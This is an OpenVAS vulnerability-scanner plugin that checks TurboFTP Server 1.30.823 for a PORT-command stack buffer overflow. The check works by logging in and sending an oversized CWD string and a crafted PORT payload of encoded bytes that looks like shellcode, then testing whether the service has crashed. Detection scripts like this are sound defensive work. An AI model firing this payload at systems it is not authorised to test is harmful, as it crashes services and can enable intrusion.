###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_turboftp_server_port_cmd_bof_vuln.nasl 13497 2019-02-06 10:45:54Z cfischer $
#
# TurboFTP Server PORT Command Processing Buffer Overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803105");
  script_version("$Revision: 13497 $");
  script_bugtraq_id(55764);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:45:54 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-10-22 18:55:24 +0530 (Mon, 22 Oct 2012)");
  script_name("TurboFTP Server PORT Command Processing Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/50595/");
  script_xref(name:"URL", value:"http://www.naked-security.com/nsa/236580.htm");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50595");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117571/turboftp_port.rb.txt");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_tag(name:"solution_type", value:"VendorFix");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/turboftp/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a
  stack-based buffer overflow via an overly long IP octet string.");

  script_tag(name:"affected", value:"TurboFTP Server version 1.30.823.");

  script_tag(name:"insight", value:"A boundary error occurs during the parsing of an FTP port command,
  which will result in a stack-based buffer overflow.");

  script_tag(name:"solution", value:"Update to version Versio 1.30 Build 826 or later.");

  script_tag(name:"summary", value:"This host is running TurboFTP server and is prone to buffer
  overflow vulnerability.");

  script_xref(name:"URL", value:"http://www.tbsoftinc.com/download.htm");
  exit(0);
}

include("ftp_func.inc");

port = get_ftp_port(default:21);
banner = get_ftp_banner(port:port);
if(!banner || "TurboFTP Server" >!< banner){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(! login_details)
{
  close(soc);
  exit(0);
}

exp = "CWD " + crap(3000) + "\r\n";

data = "98,81,113,65,133,25,65,0,42,105,75,0,116,96,95,0,42,248,70,0,149,59," +
       "66,0,39,58,66,0,153,28,93,0,93,173,76,0,107,177,74,0,1,0,0,0,246,247," +
       "94,0,0,16,0,0,57,113,93,0,64,0,0,0,224,241,77,0,133,25,65,0,57,38,80," +
       "0,144,144,144,144,152,129,70,0,137,194,129,234,0,16,0,0,129,236,0,16," +
       "0,0,102,129,202,255,15,66,82,106,2,88,205,46,60,5,90,116,239,184,119," +
       "48,48,116,137,215,175,117,234,175,117,231,81,49,201,49,192,2,4,15,65," +
       "102,129,249,122,2,117,245,58,4,15,89,117,209,106,64,49,237,102,189,255," +
       "15,69,85,106,1,87,87,86,195,78,122,102,102,121,103,77,70,88,100,98,69," +
       "102,68,79,98,109,100,122,84,113,74,107,74,112,89,69,122,66,110,105,89," +
       "106,106,120,88,70,81,71,76,112,69,105,121,116,74,88,102,84,78,118,79," +
       "105,103,110,72,119,113,111,100,110,116,70,119,67,88,102,78,70,67,106," +
       "68,116,67,79,84,74,100,70,71,84,74,79,120,103,71,114,108,117,86";

exploit = "PORT " + data ;

ftp_send_cmd(socket:soc, cmd:exp);

for(i=0; i<=3; i++){
  ftp_send_cmd(socket:soc, cmd:exploit);
}

close(soc);

sleep(5);

soc1 = open_sock_tcp(port);

if(!soc1){
  security_message(port);
  exit(0);
}

# Some time server will be listening, but won't respond
banner =  recv(socket:soc1, length:512);
if(! banner || "TurboFTP Server" >!< banner){
  security_message(port);
}
close(soc1);
